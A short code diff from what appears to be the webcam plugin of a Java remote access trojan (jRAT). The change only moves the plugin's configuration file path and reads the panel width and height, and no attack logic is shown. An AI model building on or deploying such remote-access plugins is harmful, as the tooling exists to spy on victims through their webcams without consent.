@@ -33,7 +33,7 @@ public class WebcamPlugin extends RATPlugin {
 	public void onEnable(OnEnableEvent event) throws Exception {
 		try {
 			Properties prop = new Properties();
-			prop.load(new FileInputStream(System.getProperty("jrat.dir") + File.separator + "plugins/Webcam/config.properties"));
+			prop.load(new FileInputStream(System.getProperty("jrat.dir") + File.separator + "files/plugins/Webcam/config.properties"));
 
 			PanelWebcam.WIDTH = Integer.parseInt(prop.getProperty("width"));
 			PanelWebcam.HEIGHT = Integer.parseInt(prop.getProperty("height"));
